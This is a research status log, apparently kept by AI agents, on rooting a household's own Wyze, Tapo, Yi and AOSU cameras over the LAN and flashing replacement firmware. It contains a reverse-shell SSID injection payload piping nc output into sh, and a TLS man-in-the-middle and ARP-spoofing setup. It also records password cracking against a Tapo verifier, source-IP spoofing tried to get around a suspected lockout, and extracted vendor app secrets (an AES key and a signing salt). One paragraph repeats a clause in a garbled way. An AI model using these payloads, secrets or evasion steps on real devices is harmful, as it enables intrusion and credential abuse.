# Fleet liberation status — Aardvark, 2026-10-22

Goal: root on the owner's cameras over the LAN only, then replace vendor firmware with open
standards (RTSP/ONVIF) plus native tailnet membership. No SD card, no UART, no disassembly, no
vendor developer program.

This file is the honest scoreboard. Everything is owner-device research; nothing is flashed.

## Session 2026-10-24 (CloudyMill, six panes) — supersedes the table below

Measured, not inferred. Nothing was flashed with our own bytes.

| Family | What actually moved | What is now proven | The one thing that blocks |
|---|---|---|---|
| Wyze Cam v4 `.4.23` / `.4.24` | command channel fully decoded from the `.32` binary; **`powerOff` executes on the device**; in-flight body rewrite implemented | shadow delta does **not** dispatch, the cloud's own AES-free XXTEA command does; bodies re-encrypt byte-identically; `upgrade` is 1233, `delDev` is 1234; the "model constant" is a product-type table | `begin_upgrade` answers `code 2 "Device is upgrading now"` for every record id and `get_upgrade_firmware` 500s, so the device-command path cannot be exercised. Delivery itself is already proven (device GET 200 of a 9.8 MB capsule, official installer ran as root) |
| Wyze `.4.24` (AV) | AV record layout settled from the binary; the two real reasons every earlier frame was inert found and fixed | a `0x41414141` frame crashes `iCamera` via the settled layout; `.32` gadget `0x4747F0` byte-verified | the spawned shell's uid is still unknown and no escalation is named; the crash is frame-to-frame flaky |
| Tapo C460/C660 `.4.70/.4.71` | **unauthenticated root-group `stok`**; offset 1060 confirmed; ramdisk carved (stored chunks, per-chunk trailer) | the overflow reaches `pc`; the DS crash is clean and recovers in ~40 s; the ramdisk layout is mapped | the app region is **encrypted** (7.997 bit/B, no squashfs/FIT/uImage), so `/bin/main` is not in the image: the address walk is the only route left |
| AOSU HomeBase `.4.37` | signer reconstructed offline (`cmd 1` is a KDF over `t_s.bmp`; `tecrkcehc_ext` forged; re-signed `/log.json` accepted) | the app's signing chain is reproducible without the vendor library's assets | `/api.json` login still `SING_VALIDATE_FALED`; the iOS build uses a different app id and BMP |
| Canary `.6.85` | 15-minute poisoned capture (7 frames), APK trust analysis | app is unpinned, device emitted no TLS at all | no wake event; every local surface refused |
| Owlet `.4.163` | endpoint map, TUTK/UDP control plane identified, **LAN-search 63616 answers** | forged chain is rejected (`unknown_ca` ×5) — a device trust-store negative, not a forgery failure | the session layer behind 63616 is unmapped (follow-up `fss-gpooi`, `fss-kemuu`) |
| Yi `.6.156` | payload + listener staged, injection procedure written | the metacharacter fits the 32-octet SSID budget | macOS Internet Sharing cannot be brought up headlessly here: `kickstart` is SIP-refused and the GUI toggle rewrites the SSID |
| Firmware | **the whole image now builds from source** in a Linux container and is verified structurally; installer dry-run passes end to end | 16 MiB image, boot+kernel regions byte-identical to the base, env rewritten, tailscale + init script present, six-partition write order proven | nothing but a device to flash it to; the capsule is armed with our image |

Cross-cutting fact that cost the most time and must not be re-learned: **the Eero proxy-answers ICMP
for asleep or off-segment devices.** Liveness is `sudo arp -an`, never `ping`. The Tapo pair were at
`.4.70/.4.71` the whole time while a whole thread probed `.6.70/.6.71`.

## Where each family actually stands

| Family | Unit(s) | Root mechanism | State | Blocking fact |
|---|---|---|---|---|
| Wyze Cam v4 (HL_CAM4 4.52.17.26) | `.4.23`, `.4.24`, `.5.242`, `.6.25`, `.5.181` | `assis` OTA: cloud descriptor → our HTTPS → tar → `sh upgraderun.sh` as root | **delivery plane complete, dispatch not firing** | the device consumes shadow deltas and accepts `run_action` (`code 1`, `result 3`) but issues no GET |
| AOSU HomeBase H2E | `.4.37` | Tuya 3.5 LAN OTA `0x1A/0x1B/0x1C` inside the authenticated session | unstarted; unauthenticated 51028 proxy confirmed earlier | `local_key` not recovered, so no session; digest-vs-hmac question unresolved |
| TP-Link Tapo C460 v1.0 | `.6.70` / `.6.71` | CVE-2026-105810 `connectAp` stack overflow (auth) | payload built, never sent | needs an admin session; the offline `device_confirm` verifier did not crack the password (1.65 M candidates) |
| Yi IPC | `.6.156` | CVE-2018-3910 SSID command injection into `popen` | mechanism only, never fired | needs one app re-provision onto an attacker SSID (physical-ish, allowed) |
| Canary | `.6.85` | unknown; outbound-only | located, zero open TCP ports, UDP quiet | no inbound surface at all |
| Owlet | not located | unknown | not on the LAN by OUI or by TUTK `0x0601` sweep | device identity unknown |

## What is now proven, per layer

1. **Delivery** (Wyze): owner token → device IoT certificate issuance (`200 SUCCESS`) → mutual-TLS
   MQTT to the AWS IoT broker with the device `thing_name` → shadow delta accepted and echoed into
   `reported`. A Let's Encrypt endpoint the device's own CA bundle validates
   (`ssl_verify_result 0`) is live. The missing link is the device-side dispatch, not the plumbing.
2. **Replacement firmware**: a 16 MiB Thingino image with `tailscaled` 1.104.2, `serve` rules for
   TCP 554/80, dropbear, ONVIF and prudynt RTSP is built and deterministic (`docs/exploit/firmware-build.md`).
   Boot region is byte-identical to the pinned upstream installer image; only rootfs/env differ.
3. **Install script**: `deliverables/scripts/upgraderun.sh` reads `/proc/mtd`, refuses an unexpected
   map, streams every partition out first, verifies a pinned image digest, writes high-offset first
   and the bootloader last.
4. **Exploit dogfood**: CVE-2026-38698 on this build is a remote DoS, not a root primitive
   (`docs/exploit/av-overread.md`). It is still useful as a forced-iCamera-restart trigger.

## The one thing to do next

Power-cycle `.4.23` with the current `desired` shadow state (URL + real MD5 already published). The
cloud reports `conn_state 1` and every `run_action` is accepted, so a boot-time resync is the
cheapest way to distinguish "dispatch never fires" from "dispatch fires only at boot". If the server
log shows a GET, the rest of the chain is already built and the negative capsule / no-write capsule
/ flash sequence can run in order.

## Safety invariants

- One camera per agent; TUTK refuses concurrent sessions.
- Nothing writes flash until the negative 20-byte capsule has produced a GET and the MD5 gate has
  been observed.
- The full-image write includes the bootloader; the only recovery from a bad boot write is TFTP/USB
  plus UART, which is outside the current constraint.

## Resumption after a power cycle (the one thing that needs hands)

**Any** lab unit's MQTT client is dead after one interaction — a publish or a proxy connect kills it and a
cloud `restart` cannot revive it (the command rides MQTT). All three units ping and answer TUTK; only the
client is gone. That makes a physical power cycle the single gate for the capture, and it applies to
whichever unit is tried, not just `.4.24`. and a cloud `restart` cannot revive it (the command rides MQTT). TUTK
still answers, so only the client is gone. When someone can unplug it for five seconds:

```sh
sudo bash deliverables/scripts/wyze_mitm_up.sh      # dns + spoof + tls + proxy, prints a verdict each
# wait for ping, then watch /tmp/mqproxy.log — SUBSCRIBE lines are the capture that has been missing
```

Then publish one delta to `https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/9.9.9.9.tar`
with that file's md5 and watch `/tmp/tls.log` for the GET. The forged chain already verifies against the
device bundle, so nothing else has to be rebuilt.

The MITM no longer depends on the camera's DNS: `wyze_mitm_up.sh` installs an rdr rule that DNATs the
unit's port 8883 to the proxy (macOS needs `rdr-anchor "fss"` + `load anchor "fss" from
"/etc/pf.anchors/fss"` in the translation section of `/etc/pf.conf`; `/etc/pf.conf.fss-bak` is the backup).
`wyze_ota_push.py` publishes the delta for a local payload in one command and PUBACKs.

## Retest log, 2026-10-23 02:0x (MagentaOwl)

| Unit | Reachability | Consequence |
|---|---|---|
| `.4.37` AOSU | ping + 443/6668/51028 open | unchanged; the 51028 proxy is still alive |
| `.4.24` Wyze | ping + 53 open, sessions work | unchanged |
| `.6.70` / `.6.71` Tapo | ping + ARP, **all TCP filtered** (80/443/554/2020/6668/8800) | cannot re-verify the model over the wire right now |
| `.6.156` Yi | ping + ARP, TCP 80 closed as always, **WS-Discovery now silent** | injection remains the only path; nothing to hit first |
| `.6.85` Canary | **does not answer ping** | was up earlier today, now unplugged or asleep |

The Tapo pair answering ICMP while dropping every SYN is consistent with a source-address ban after
the earlier 1.2 × 10^9-candidate `device_confirm` run; it is not consistent with the units being off
(ARP resolves and ICMP is answered). Recorded so the next reader does not read it as a model change:
the C460 v1.0 / C660 v1.6 identification came from UDP 20002 TDP and still stands, and **every
published 2026 Tapo CVE is model-locked away from both units**.

### AOSU — why it cannot move without one secret

`0x1A/0x1B/0x1C` live inside the authenticated Tuya 3.5 GCM session, so the LAN OTA question cannot
even be asked without the 16-byte `local_key`. Nothing on the wire yields it and the account API has
no `localKey` field; the only source is the Tuya OEM channel, which needs the app's signing material
(extracted, still `ILLEGAL_CLIENT_ID`). Every downstream step is scripted and waiting:
`deliverables/scripts/ev-pack-h-003-send-ota-start.py` sends the wrong-shape `0x1A` first, then a
wrong-digest body — the ordering matters because a parse failure returns the same `retcode 1` as a
digest rejection.

### Yi — what is staged, and what still needs a human

`deliverables/scripts/yi_u1.py` now carries both payloads with their length check
(`x$(nc 192.168.4.160 4444|sh)`, 28 octets, fits in the 32-octet SSID budget; the quoted
`telnetd` fallback at 22) and a listener that gives an interactive root shell. Remaining human step:
broadcast that SSID and re-provision the camera in the Yi app. Pass condition is a shell from
`192.168.6.156`; the persistence pass is the same shell after `reboot` with the SSID unchanged.

### Dispatch experiments that all failed (do not repeat)

1. Delta with the stale `desired` still set → no GET.
2. Fresh delta, `.tar` URL, both the zero MD5 and the *true* MD5 (i.e. one matching and one
   not-matching the file) → no GET.
3. Third delta with a deliberately different MD5 (`1111…`, neither the file's nor `reported`'s) so
   the device could not dedupe on digest → no GET.
4. Vendor-shaped path `/wuv2/upgrade/HL_CAM4/firmware/<ver>.tar` instead of a bare name → no GET.
5. `run_action` after the params were understood (`app_ver` required, else `1001`) → `code 1`,
   `result 3`, `session_id`, still no GET, no reboot after 25 s or 150 s.

So the device consumes shadow state (`reported` tracks every key we set) but does not act on it
without a resync. **The single remaining test is a power cycle**, or tapping the device's own MQTT
session to see whether any `cmd` frame is delivered at all.

### Why an iCamera crash is not enough to resync the shadow

Crashing `iCamera` only restarts that one process; `iotclient` — the process that owns the MQTT
session and the shadow subscription — keeps running, so the delta is never re-delivered. Verified:
a triple crash run on `.4.24` killed the stream at 10.6 s, the box answered ping 5 s later, and the
`desired` URL was still un-fetched. For the same reason the cloud `restart`/`reboot` actions
(`result 3`) do not help. `docs/exploit/ota-path.md` §9.7 lists the five dispatch variants that
also failed. The box needs a real power cycle.

## 02:3x — source-IP spoofing tried, and what it proved

`sudo ifconfig en1 alias 192.168.6.200/22` plus `curl --interface` from three different source
addresses (`.6.200`, `.4.222`, `.4.169` — the latter two were already aliased on this host). Result:
identical, nothing. Combined with ARP resolving and ICMP answering, **the Tapos are not banning us —
they are simply not serving TCP or UDP 20002**. They are asleep and only the AP's proxy answers
ICMP. Waking them needs the app to open a stream. That closes the "ban" hypothesis and the
"spoof our way back in" idea.

## AOSU API is reachable now — and the exact blocker has a name

Concrete progress from the same push:

- `api-us.aosulife.com` answers again, but **only with the app User-Agent and POST**; a bare GET
  returns `404 page not found`. That is why the earlier replay looked dead.
- The captured `gz-sid` is genuinely expired (`202 sid过期`) — so re-login is mandatory.
- `/v1/user/login` exists and answers `200` with `104 pid参数错误`: the login needs a **`pid`**, and
  `pid` is not the bundle id (`com.glazero.ios`), not `com.glazero.android`, not the iotbing
  `clientId`, not a small integer in body, query or `gz-pid` header (0..300 swept, plus 11 symbolic
  candidates). It is the one unknown.
- The device-side answer to "does the homebase take plaintext 3.3 frames without a key?" is **no**:
  well-formed `0x000055AA` 3.3 frames for `HEART_BEAT` and `DP_QUERY` are accepted at TCP level and
  never answered, matching the earlier probe log. There is no keyless control channel.

So AOSU is exactly one integer away from an authenticated session, and nothing else on the network
substitutes for it.

## 03:2x — AOSU cloud session obtained (login fully reversed from the 5.10.12 APK)

The `pid` blocker is solved and the login is no longer opaque. Everything below was read out of
`Aosu_5.10.12_APKPure.xapk`, not guessed:

| Element | Where it comes from |
|---|---|
| `Gz-Pid` must be **`glazero`** | `AppConstant.APP_CHANNEL_PID` → `AppChannelPlatform.OooO0OO()` → `AppChannel.OooO0oO()` |
| login is **form-encoded** `POST /v1/user/login` with `region,countryCode,countryAbbr,type=1,email,password,pwType=2` | `AccountCenter.OooOooO` → `AccountWebService.OooO0oO` |
| `password` = base64(AES-128-CBC/PKCS7), **key = iv = `PZR1ryiUhJloWoRd`** | `SecurityCore.nativeEncryptP` → `libglazero-security.so:0x18bc4`, passed as both key and IV to `aes_encrypt_pkcs7` |
| `Gz-Sign = md5("uuid:<u>:t:<t>:&sM&GGlUCSXjZqQNxmkdU^scUs**0R@C")` | `SignInterceptor` |
| app UA + `uuid`/`t` query params are mandatory | `CommonInterceptor`; a bare GET 404s |

Verified live: `errno 0 成功`, a session, and a full inventory — `Rear Door Cam`,
`Solarium Cam`, `Front Door Cam`, `Driveway Cam`, `HomeBase` (`H2E`, sn `H2E2DA110000807`).
Client: `deliverables/scripts/aosu_cloud.py` (`login` / `devices` / `call`), smoke-tested.

**`local_key` is still not in this API.** Checked and negative: `getList` (incl. `{"detail":1}`),
`getInfoBySn`, `getModelInfoBySn`, `getInfoByCode`, `capability` (base and child sn), `bind/getToken`
(returns a pairing token, not a key), `sts/getMultiMqttInfo`. It comes from the Tuya
`a1-us.iotbing.com/api.json` gateway, which needs its own sign; the captured iotbing call still
replays successfully, so that session is alive, but generating a *new* action needs the signing
routine inside `libthing_security.so`. That is the one remaining step before `0x1A/0x1B/0x1C` can be
sent.

## 23:4x — the flash path is staged end to end; one power cycle away

Two things were broken and are fixed:

- **The HTTPS server had died and a stray `python -m http.server` had grabbed 8443 on the IPv6
  wildcard only**, so `ota.frankenfs.com` (an A record to the IPv4 address) refused connections for
  roughly an hour. That alone can explain several of the failed deltas. It is restarted on
  `192.168.4.160:8443` with the Let's Encrypt chain and verified `200`.
- The image is now served over plain HTTP on `192.168.4.160:8080` (the device-side `wget` has no
  TLS), and the capsule is served over the HTTPS path the OTA requires.

A **dry run of `upgraderun.sh` in a sandbox** — fake `/proc/mtd` summing to exactly 16 MiB, stub
`dd`/`nc`/`wget`, real image file — completed and produced: geometry accepted, six backups
streamed, digest verified, all six partitions written with the exact sizes, **highest partition
first and `uboot` last**, then reboot. The 13.5 MiB fake map was correctly refused first, so the
guard works.

Staged now:

| Artefact | URL | MD5 |
|---|---|---|
| negative (20 B, no tar, no write) | `.../4.52.17.30.tar` | `6909e9ca42b912662c04e6e98d7c5821` |
| real capsule (busybox + installer) | `.../4.52.17.31.tar` | `bf0535f59515f71a04ba00bd2176ffd2` |
| image (tailnet build) | `http://192.168.4.160:8080/img.bin` | sha256 `546c24f8…` |

`desired` currently holds the **negative**. Sequence is two power cycles: cycle 1 proves delivery
and the MD5 gate with zero writes; then publish the capsule (`pub.py …/4.52.17.31.tar
bf0535f5…`) and cycle 2 flashes.

Also checked and negative: **no `paracfg` item reboots the box.** All 157 entries of the table at
`0x8c5da8` were scanned for a reference to the `"reboot -f"` string (`0x834840`) — none. The only
caller of the reboot block (`0x457010`) is a video-service-change path that our K10000 retry with
changed resolution did not reach. So a reboot cannot be synthesised from the wire; it is a power
cycle or nothing.

## Tuya sign — what is now known, precisely

The gateway resolves the action name *before* validating the signature, which let the coverage be
measured empirically: changing `a` to an unknown name returns `API_OR_API_VERSION_WRONG`, changing it
to a real one returns `SING_VALIDATE_FALED`. So `a` **is** signed, as are `sid` and `postData`;
`t` is not (a request with only `t` replaced replays fine). Signing is
`ThingApiSignManager.generateSignatureSdk` → sorted `k=v` joined with `||` (with `postData` replaced
by a swapped MD5-base64) → `SecureNativeApi.doCommandNative(ctx, 1, bytes)`, i.e. a native command in
`libthing_security.so`. That library exports no `Java_*` symbols — it registers through
`JNICLibrary.loadSo` → `RegisterNatives`, so the address has to come from `JNI_OnLoad`'s table rather
than `nm`. Reimplementing it needs either an ARM64 runtime or a careful read of the native command-1
body; the userland guesses (HMAC/append/prepend over clientId, sid, deviceId, bundleId, empty) were
all tested against a known pair and all miss.

Both Wyze cameras now carry the negative delta; `docs/exploit/FINISH-WYZE.md` is the two-cycle
runbook.

## Tuya signer runs offline now (arm64 container)

A working harness exists at `tools/thing-sign/`: the real `libthing_security.so` loads under
Alpine/musl (musl ignores the bionic `LIBC` symbol versions) with a stub for the bionic-only surface,
stub Android classes for the `Context` walk, a real DER certificate for the signature field, and
assets served from disk. `computeDigest("abc","key")` → `aee1dd678aea01125dfc861f41d4072d` proves the
crypto core runs, and `doCommandNative(ctx, 1, …)` reaches the signer and reads `assets/t_s.bmp`
(100×75 BMP, stego key).

The real Glazero signing certificate came out of the APK's v2 signing block (no v1 files exist), so
the `Signature` field is genuine. Three gaps remain, all named: `assets/tecrkcehc_ext` (opened by the
signer, absent from the APK — currently a copy of `t_s.bmp` as a guess), `checkStatus` still returning
**-1** (anti-tamper) even with the real cert and package name, and the **appSecret** that `doCommandNative(ctx, 0, secret, appId, …)` needs at SDK init — we only have the
appId (`clientId`). With the clientId substituted, `cmd 1` returns null, so the init path is where
the next hour goes.

`checkStatus` is raised by a JNI_OnLoad-spawned **thread**, so it is asynchronous: it reports `-1`
first and then opens `tecrkcehc_ext`. The call chain is settled —
`cmd 0 = init(secret, appId)` (return value ignored, so our null is normal), `cmd 1 = sign(string)`
with a null second array, `cmd 2 = ecode`. Calling `cmd 1` *immediately* after load also returns
null, before the check can report, which moves the gate off the status flag and onto the init key:
the appSecret. `tecrkcehc_ext` and `t_s_daily.bmp` are both runtime-supplied; four placeholder
formats (BMP copy, random bytes, hex digest, JSON digest) leave the status at -1 or bail earlier.

Caught while verifying: the file staged *as* the negative had been overwritten by a capsule (2.3 MB
under a name whose advertised MD5 belonged to the 20-byte fixture). Restored, both digests re-checked
against the values that are published, and `FINISH-WYZE.md` now opens with a four-command pre-flight.

The armed delta itself was also stale: `desired` still pointed at a **port-less** URL (443, where the
IPv6-only listener used to be) with the wrong MD5 (`6a56ddd8…`, the capsule that had overwritten the
negative). Both shadows are now re-armed with `https://ota.frankenfs.com:8443/…/4.52.17.30.tar` and
`6909e9ca…`, verified by reading `desired` back.

Port 443 cannot be reused even as root: another daemon already listens there and answers `404` for
our paths, so the operational port stays 8443 and every armed URL carries it. Also probed for the SDK
credentials one more time — `/v1/app/getInfo` is a *region* probe and returns only `{"region":"us"}`
on both `api.aosulife.com` and `api-us.aosulife.com`; the `clientId` is not a literal anywhere in the
APK (plain, UTF-16 or in `resources.arsc`), which fits it and the secret being handed to the app at
runtime.

`genKey("a","b","c")` returns `3ba87e9e0c9bf5b6` **without any init and with the check at -1**, so the
library is healthy and the gate is precisely `cmd 0`'s key material — not a general failure of the
harness, and not the anti-tamper flag. `computeDigest` and `genKey` both answer; `cmd 1` is the only
entry that returns null. That narrows the remaining work to a single value, and `.4.24`'s shadow was
re-read to confirm the corrected negative URL/MD5 is what it actually holds.

`cmd 0` is **length-sensitive**: a 20-character seed (the clientId) runs clean and yields `cmd 1 =
null`; 7-, 4- and 0-character seeds crash in native code. `cmd 2` (ecode) crashes without a completed
init. So the appSecret is a 20-character value like the appId, and every path — sign and ecode — runs
through it.

Corollary: `tecrkcehc_ext` is **parsed**, not ignored. Leaving a hex-digest or random-bytes file there
makes `cmd 0` fault at `pc=0`; a BMP-shaped file (even the wrong one) runs clean to `INIT=null`. So
the extension blob has a structured format, and its absence is currently masked by a stand-in that
parses — which keeps the baseline stable but cannot satisfy the checker.

`tecrkcehc_ext`'s format is now known from the parser at `0x192d0`: it scans for the first `\n`,
parses the **decimal integer** before it into `ctx+0x14`, then **base64-decodes** everything after the
newline (`mbedtls_base64_decode` at `0x18ce0`) and hands the bytes to `0x18c68`. So the file is
`"<decimal>\n<base64>"`, and a random/hex file crashes exactly because it has no such shape.

Placeholders in that shape (a decimal plus base64 of the cert digest, upper/lower hex variants, with
and without trailing newline) all parse cleanly and all still leave `checkStatus` at `-1`, so the
blob's *content* is an encrypted or signed record, not a bare digest. The parser being mapped means
the remaining work on this file is content-only, not structure.

Server identity was worth checking: port 8443 was held by a stray **`openssl s_server`** (root, IPv6
wildcard, its own document root, no request log), not by `serve.py`. It is replaced by the Python
server bound to `192.168.4.160:8443`, and the handler now logs the **User-Agent** so a device request
is distinguishable from our own probes (`ua=curl/8.7.1`). Earlier attempts could have been answered by
a different root without anyone seeing it.

The `cmd 1` path calls `read_keys_from_content(content, &arr, &count)` at `0x14020` and bails when it
returns non-zero — so keys are *extracted from content*. Two 20-char secrets (740 candidate strings
lifted from the dex, including the clientId) all yield `cmd 1 = null`, which means the appSecret is
**not** the gate: whatever feeds `read_keys_from_content` is. The natural reading is that
`tecrkcehc_ext` is that content (base64-decoded at `0x18ce0` and passed straight in), with `t_s.bmp`
supplying the stego key, and neither the real blob nor `t_s_daily.bmp` ships in this APKPure build.
No asset pack is present either — the splits are only `config.*` — so a Play-installed copy (or its
data dir) is the surest source of the blob.

Mirror attempts for a Play-style build: `apkmirror` answers the generic search page but has no
`/apk/<dev>/<app>` for this package under `glazero` or `aosu`, and its `uploads/?appcategory=` view
returns 403 to curl. `apkpure` is Cloudflare-walled. So the blob currently has no automated source;
an installed copy on a device (`/data/data/com.glazero.android/…`) or a Play-signed bundle is the way.

## Tapo: the oracle is now offline (no network, no ban)

`TP-Link Tapo 3.22.105` was used to settle the verifier from code, not inference —
`SecureUtils__SecureUtilsKt.b` computes

```
device_confirm = SHA256(cnonce + SHA256(password) + nonce) + nonce + cnonce
```

(`h.p` is the inner SHA-256; the result is hex and compared case-insensitively). A captured triple
from `evidence/excerpts/H-005b` (cnonce `EE5CA138D413A3D6`, nonce `C87CEA0BF708DC5D`, confirm
`9E5645…`) makes that fully checkable locally: `tools/tapo_oracle.c` runs at ~2 M candidates/s over
8 threads and exhausts `rockyou` (14 344 391 lines) in **7 s**.

Already refuted: all of `rockyou`, and 2.1 M `Dickles`/`dickles`/`DICKLES` + 0-99999 + symbol masks.
So the fleet password is not a dictionary word and not the AOSU pattern with a different number; it
looks like the same generation as the Wyze one and needs a mask or a known string. The verifier no
longer needs the unit to be awake, which removes the ban from the critical path entirely.

## Yi is a TUTK camera, not ONVIF-only (from the 6.9.9 app)

`config.armeabi_v7a.apk` ships `libIOTCAPIs.so`, `libAVAPIs.so` and `libPPPP_API.so` — the ThroughTek
P2P SDK — so the Yi IPC speaks TUTK, the same family as the Wyze units and the same family this
repository already has a first-party sans-IO stack for (`fss-tutk`). The provisioning UI also carries
`activation_sendSoundWaves` and `activation_qrCodeBinding`, i.e. **sound-wave and QR** binding, both of
which can be driven from a laptop instead of a phone.

The unit itself is currently dormant: legacy `0x0601` on 32761 is silent and an unsigned `0xCC51
0x1002` discovery is silent too, matching the earlier dead TCP 80 and now-silent WS-Discovery. That is
the same "nothing answers until it is awake" state the Wyze pair showed, so a power cycle is the
precondition for any of this — not a new finding about the camera.

Also from the Yi app: its Room schema carries `tnpServerString` and `tnpLicenseKey` next to `ssid`,
`localIp`, `mac` — confirming a **TNP** control plane alongside TUTK for media, and that both the TNP
server and a per-device licence key are issued at activation. Those two values, not just the Wi-Fi
credentials, are what an activation actually provisions; that is why a bare SSID change is not enough
for anything but the injection trick.

Tapo masks: a further 8 M separator/case variants (`Dickles|dickles|DICKLES|Dickel|dickel` ×
`"" . _ - # @ " " !` × 0-99999 × optional `$`) also miss. Together with rockyou and the earlier 2.1 M,
that is ~24 M candidates with no hit, so the passphrase is generated rather than derived from the name.

A five-minute refresher (`/tmp/ota/keepfresh.sh`, log `/tmp/ota/keepfresh.log`) now re-publishes the
armed negative to both cameras so a power cycle never finds a stale delta; it must be stopped before
publishing the capsule or it will revert the shadow. Yi re-tested while responsive to ICMP: TUTK on
32761, 10001 and 9999 all silent, so the userland really is down and a power cycle is the only remote
lever there too.

Yi after the owner's power cycle: answers ICMP at 12-16 ms (awake, no longer in power-save) but TCP
80/554/23 stay closed, WS-Discovery is silent again and TUTK on 32761/10001/9999 is silent. So the
unit is up with **no userland services**, i.e. the pre-provisioning state — which is exactly the state
U1 needs. `deliverables/scripts/yi_u1.py serve` is listening on `192.168.4.160:4444` (log
`/tmp/yi_listener.log`) and now survives a non-tty stdin by logging device output only. CoreWLAN SSID
enumeration was attempted to confirm its setup AP but TCC reports `denied` for the CLI binary, so the
AP name is unverified; joining it is not required for U1, which works through the app's Wi-Fi field.

Tapo masks since then: owner first name/surname and common theme words (`Aardvark`, `Franken…`,
`Dicklesworth`) with 0-9999 and symbol/year tails — another ~150 k, all miss. Roughly 24.2 M
candidates total. The verifier is exhausted for name/word families; the value is random or
non-obvious.

`docs/exploit/yi-u1.md` now carries the whole U1 procedure, the observation table that distinguishes a
working injection from a stripped metacharacter, and the post-shell order (`id` first, never assumed).

## fss-discover: listener probe wired, and a host anomaly worth knowing

Two real defects were fixed in the binary rather than described:

- `arp -a` returns an **empty table on macOS 27**; the census only ever called `-a`, so every MAC
  was empty, every OUI lookup starved and every Wyze unit fell out as `Unknown`/`ImportOnly`. The
  harvest now tries `-an` first (immediate, numeric) with `-a` kept as a fallback.
- `Signal::TutkListener` existed in the classifier but **nothing ever supplied it** — dead code.
  A credential-less `0x0601` probe round now runs over the candidates before classification and
  upgrades a responder to `Tutk`/`Likely` with `adapter=tutk`, 8 spaced rounds with a 300 ms drain
  each (Wi-Fi power-save swallows the first frames; one attempt is never enough).

Resolved anomaly: the empty table is a **privilege** effect, not a spawn effect. macOS 27 returns
`arp -an` rows only to root (0 rows for any unprivileged caller, shell or child alike); `netstat -rn`
is unaffected. The harvest already falls back to `sudo -n /usr/sbin/arp -an`, and a live sweep now
classifies real hardware — `eero inc.` infrastructure, `Shenzhen Glazero` as Tuya, `TP-Link` as
EmbeddedWeb/Standards — where before every MAC was empty and every row Unknown.

## fss-provision: Wyze is no longer "no software path"

`Transport::None` with empty steps encoded the old belief that the v4 could only be ingested. The
recipe now carries the real chain: `NetworkUpdate` with `publish_upgrade_descriptor` →
`serve_owner_capsule` → `power_on_for_flash` → `verify_post_flash`, prerequisites
`owner_account_token`, `trusted_tls_chain`, `web_update_endpoint`. Three new `StepKind`s and two new
`Prerequisite`s were added; the rationale text now states the actual gate (caller-supplied MD5, root
script, separate boot-chain verification) and the eMudhra TLS route. 37 provision tests pass, and the
planner's Wyze expectation moved from `LaneIngest` to `Flashed`.
